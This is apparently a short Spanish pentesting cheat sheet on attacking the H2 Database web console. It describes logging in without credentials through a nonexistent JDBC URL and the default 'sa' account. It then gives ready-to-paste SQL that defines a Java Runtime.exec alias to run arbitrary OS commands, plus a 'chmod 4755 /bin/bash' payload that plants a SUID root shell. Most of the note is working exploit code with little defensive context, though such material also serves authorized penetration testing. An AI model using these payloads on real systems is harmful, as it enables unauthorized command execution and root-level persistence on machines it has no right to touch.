Si tenemos acceso al panel de inicio de sesión de H2 Database, podemos correr queries sin una autenticación. Para ello, vamos a cambiar el parámetro _URL JDBC_ a una ruta que no exista y dejamos por defecto el usuario sa y sin password.

![image](https://github.com/SrMeirins/KnowledgeVault/assets/95763783/0ef41a98-6be2-4db4-a74b-8f3b29a4fce8)

Vamos a correr la siguiente Query, poniendo el comando que nos interese:

```mysql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
CALL SHELLEXEC('id')
```
![image](https://github.com/SrMeirins/KnowledgeVault/assets/95763783/1fca5030-afac-480c-93a6-2b360451bf56)

**Si H2 Database lo esta corriendo ROOT** --> La idea aquí sería darle privilegios SUID a /bin/bash para desde un usuario no privilegiado poder escalar privilegios.

```mysql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
CALL SHELLEXEC('chmod 4755 /bin/bash')
```
